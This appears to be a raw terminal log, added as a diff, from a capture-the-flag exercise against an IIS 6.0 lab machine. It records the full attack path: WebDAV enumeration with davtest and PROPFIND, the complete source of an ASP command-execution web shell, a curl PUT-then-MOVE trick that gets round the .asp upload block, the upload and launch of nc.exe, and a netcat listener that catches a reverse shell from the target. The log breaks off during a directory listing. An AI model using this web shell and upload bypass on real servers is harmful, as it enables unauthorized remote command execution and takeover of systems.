@@ -1,0 +1,361 @@
+┌──(root㉿kali)-[/home/kali]
+└─# davtest -url http://10.10.10.15    
+********************************************************
+ Testing DAV connection
+OPEN		SUCCEED:		http://10.10.10.15
+********************************************************
+NOTE	Random string for this session: Htqk1p6OtoeLa
+********************************************************
+ Creating directory
+MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa
+********************************************************
+ Sending test files
+PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.pl
+PUT	asp	FAIL
+PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.php
+PUT	aspx	FAIL
+PUT	cgi	FAIL
+PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.jhtml
+PUT	shtml	FAIL
+PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.cfm
+PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.html
+PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.jsp
+PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.txt
+********************************************************
+ Checking for test file execution
+EXEC	pl	FAIL
+EXEC	php	FAIL
+EXEC	jhtml	FAIL
+EXEC	cfm	FAIL
+EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.html
+EXEC	html	FAIL
+EXEC	jsp	FAIL
+EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.txt
+EXEC	txt	FAIL
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.pl
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.php
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.jhtml
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.cfm
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.html
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.jsp
+PUT File: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.txt
+Executes: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.html
+Executes: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.txt
+
+                                                                                                                     
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl -i -X PROPFIND http://10.10.10.15/ -H "Depth: 1"
+HTTP/1.1 411 Length Required
+Connection: close
+Date: Tue, 16 Sep 2025 03:09:54 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Content-Type: text/html
+Content-Length: 50
+
+<body><h2>HTTP/1.1 411 Length Required</h2></body>                                                                                                                     
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl -i -X PROPFIND "http://10.10.10.15/" -H "Depth: 1" -H "Content-Length: 0"
+HTTP/1.1 207 Multi-Status
+Date: Tue, 16 Sep 2025 03:13:03 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Content-Type: text/xml
+Transfer-Encoding: chunked
+
+<?xml version="1.0"?><a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:"><a:response><a:href>http://10.10.10.15/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:16:56.953Z</a:creationdate><a:displayname>/</a:displayname><a:getetag>"f8cbbd81b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:41 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/aspnet_client/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:43.687Z</a:creationdate><a:displayname>aspnet_client</a:displayname><a:getetag>"f84298d97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:43 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:41.687Z</a:creationdate><a:displayname>DavTestDir_Htqk1p6OtoeLa</a:displayname><a:getetag>"b262fc83b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:45 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/iisstart.htm</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">1433</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:16:56.953Z</a:creationdate><a:displayname>iisstart.htm</a:displayname><a:getetag>"05b3daec0d9c21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Fri, 21 Feb 2003 15:48:30 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/images/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.437Z</a:creationdate><a:displayname>images</a:displayname><a:getetag>"58c3b47e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/pagerror.gif</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">2806</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:16:56.953Z</a:creationdate><a:displayname>pagerror.gif</a:displayname><a:getetag>"05b3daec0d9c21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Fri, 21 Feb 2003 15:48:30 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/postinfo.html</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">2440</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.421Z</a:creationdate><a:displayname>postinfo.html</a:displayname><a:getetag>"fe60b27e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_private/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.421Z</a:creationdate><a:displayname>_private</a:displayname><a:getetag>"fe60b27e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_vti_cnf/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.437Z</a:creationdate><a:displayname>_vti_cnf</a:displayname><a:getetag>"1aafc07e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">1</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_vti_inf.html</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">1754</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.515Z</a:creationdate><a:displayname>_vti_inf.html</a:displayname><a:getetag>"1aafc07e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_vti_log/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.421Z</a:creationdate><a:displayname>_vti_log</a:displayname><a:getetag>"fe60b27e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_vti_pvt/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.406Z</a:creationdate><a:displayname>_vti_pvt</a:displayname><a:getetag>"1aafc07e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">1</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_vti_script/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.437Z</a:creationdate><a:displayname>_vti_script</a:displayname><a:getetag>"58c3b47e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">1</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/_vti_txt/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:17:19.437Z</a:creationdate><a:displayname>_vti_txt</a:displayname><a:getetag>"58c3b47e97b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:17:19 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">1</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://granny/_vti_bin/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2017-04-12T14:05:06.655Z</a:creationdate><a:displayname>_vti_bin</a:displayname><a:getetag>"ca16f87097b3d21:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Wed, 12 Apr 2017 14:16:56 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response></a:multistatus>                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat aspshell.txt                                
+<%
+If Request("cmd") <> "" Then
+    Dim shell, cmd, output
+    cmd = Request("cmd")
+    Set shell = CreateObject("WScript.Shell")
+    Set output = shell.Exec(cmd)
+    Response.Write("<pre>" & output.StdOut.ReadAll() & "</pre>")
+End If
+%>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cadaver http://10.10.10.15/
+
+dav:/> put aspshell.txt /shell.asp
+Uploading aspshell.txt to `/shell.asp':
+Progress: [=============================>] 100.0% of 238 bytes failed:
+403 Forbidden
+dav:/> put aspshell.txt /shell.txt
+Uploading aspshell.txt to `/shell.txt':
+Progress: [=============================>] 100.0% of 238 bytes succeeded.
+dav:/> 
+dav:/> mv shell.txt /shell.asp
+Moving `/shell.txt' to `/shell.asp': failed:
+Could not parse response: XML parse error at line 1: Extra content at the end of the document
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -i -X MOVE "http://10.10.10.15/shell.txt" \
+  -H "Destination: http://10.10.10.15/shell.asp" \
+  -H "Overwrite: T"
+HTTP/1.1 204 No Content
+Date: Tue, 16 Sep 2025 03:17:06 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Content-Type: text/xml
+Content-Length: 0
+
+
+
+
+
+http://10.10.10.15/shell.asp?cmd=whoami
+
+WshShell.Exec error '80070005'
+
+Access is denied.
+
+/shell.asp, line 6 
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat aspshell2.txt 
+<%
+Set objShell = Server.CreateObject("WScript.Shell")
+Set objExec = objShell.Exec("cmd /c whoami")
+strOutput = objExec.StdOut.ReadAll
+Response.Write("<pre>" & strOutput & "</pre>")
+%>
+                                                                                                                
+
+
+
+WshShell.Exec error '80070005'
+
+Access is denied.
+
+/shell2.asp, line 3 
+
+
+
+
+curl -X PUT --data-binary @shell.txt "http://10.10.10.15/aspnc.txt"
+curl -i -X MOVE "http://10.10.10.15/aspnc.txt" \
+  -H "Destination: http://10.10.10.15/aspnc.asp" \
+  -H "Overwrite: T"
+
+
+
+
+
+netcat is likely not a good idea bc we may not be able to spawn processes..
+as we are also not able to execute commands on this box
+
+The box relies on metasploit to jump to another stable process.
+
+Moving on.
+...
+nvm
+
+                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# curl -i -X PUT --data-binary @nc.exe \
+  "http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.txt"
+
+curl -i -X MOVE \
+  "http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.txt" \
+  -H "Destination: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.exe" \
+  -H "Overwrite: T"
+HTTP/1.1 201 Created
+Date: Tue, 16 Sep 2025 03:34:55 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Location: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.txt
+Content-Length: 0
+Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK
+
+HTTP/1.1 201 Created
+Date: Tue, 16 Sep 2025 03:34:55 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Location: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.exe
+Content-Type: text/xml
+Content-Length: 0
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl -I "http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.exe"
+HTTP/1.1 404 Not Found
+Content-Length: 1635
+Content-Type: text/html
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Date: Tue, 16 Sep 2025 03:35:03 GMT
+
+                                                                                                                     
+but it is in there.
+                                                                                                                  
+┌──(root㉿kali)-[/home/kali]
+└─# curl -i -X PROPFIND "http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/" -H "Depth: 1" -H "Content-Length: 0"  |grep "nc"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Transfer-Encoding: chunked
+100  6933    0  6933    0     0  45679      0 --:--:-- --:--:-- --:--:-- 45913
+<?xml version="1.0"?><a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:"><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">0</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:41.687Z</a:creationdate><a:displayname>DavTestDir_Htqk1p6OtoeLa</a:displayname><a:getetag>"14cfc9deba26dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:34:55 GMT</a:getlastmodified><a:resourcetype><a:collection/></a:resourcetype><a:supportedlock/><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">1</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.cfm</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">42</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:44.437Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.cfm</a:displayname><a:getetag>"d8696183b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:44 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.html</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">26</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:44.781Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.html</a:displayname><a:getetag>"94dd9583b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:44 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.jhtml</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">37</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:43.843Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.jhtml</a:displayname><a:getetag>"7cd0683b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:43 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.jsp</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">37</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:45.109Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.jsp</a:displayname><a:getetag>"f6eec783b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:45 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.php</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">24</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:42.859Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.php</a:displayname><a:getetag>"569c7082b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:42 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.pl</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">66</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:42.218Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.pl</a:displayname><a:getetag>"ecdbe82b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:42 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/davtest_Htqk1p6OtoeLa.txt</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">19</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:03:45.453Z</a:creationdate><a:displayname>davtest_Htqk1p6OtoeLa.txt</a:displayname><a:getetag>"b262fc83b626dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:03:45 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response><a:response><a:href>http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/nc.exe</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><a:getcontentlength b:dt="int">59392</a:getcontentlength><a:creationdate b:dt="dateTime.tz">2025-09-16T03:34:55.687Z</a:creationdate><a:displayname>nc.exe</a:displayname><a:getetag>"52e3bddeba26dc1:392"</a:getetag><a:getlastmodified b:dt="dateTime.rfc1123">Tue, 16 Sep 2025 03:34:55 GMT</a:getlastmodified><a:resourcetype/><a:supportedlock><a:lockentry><a:write/><a:shared/></a:lockentry><a:lockentry><a:write/><a:exclusive/></a:lockentry></a:supportedlock><a:ishidden b:dt="boolean">0</a:ishidden><a:iscollection b:dt="boolean">0</a:iscollection><a:getcontenttype/></a:prop></a:propstat></a:response></a:multistatus>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# # upload as text first
+curl -i -X PUT --data-binary @run_nc_test.txt \
+  "http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.txt"
+
+# move to .asp
+curl -i -X MOVE \
+  "http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.txt" \
+  -H "Destination: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.asp" \
+  -H "Overwrite: T"
+
+# Then browse/GET to execute:
+# http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.asp
+HTTP/1.1 201 Created
+Date: Tue, 16 Sep 2025 03:39:53 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Location: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.txt
+Content-Length: 0
+Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK
+
+HTTP/1.1 201 Created
+Date: Tue, 16 Sep 2025 03:39:53 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Location: http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.asp
+Content-Type: text/xml
+Content-Length: 0
+
+                                                                                                                     
+http://10.10.10.15/DavTestDir_Htqk1p6OtoeLa/run_nc_test.asp
+
+Start ASP runner\n\n
+
+Virtual dir: /DavTestDir_Htqk1p6OtoeLa
+Physical dir: c:\inetpub\wwwroot\DavTestDir_Htqk1p6OtoeLa
+nc virtual: /DavTestDir_Htqk1p6OtoeLa/nc.exe
+nc physical: c:\inetpub\wwwroot\DavTestDir_Htqk1p6OtoeLa\nc.exe
+
+nc.exe exists on disk.
+Wrote batch: c:\inetpub\wwwroot\DavTestDir_Htqk1p6OtoeLa\run_nc.bat
+WScript.Shell.Run error: 70 - Permission denied
+WScript.Shell.Exec error: -2147024891 - Access is denied.
+
+ShellExecute called (no COM error reported)
+
+Done.
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444       
+listening on [any] 4444 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.15] 1030
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>cd ../../..
+cd ../../..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 424C-F32D
+
+ Directory of C:\
+
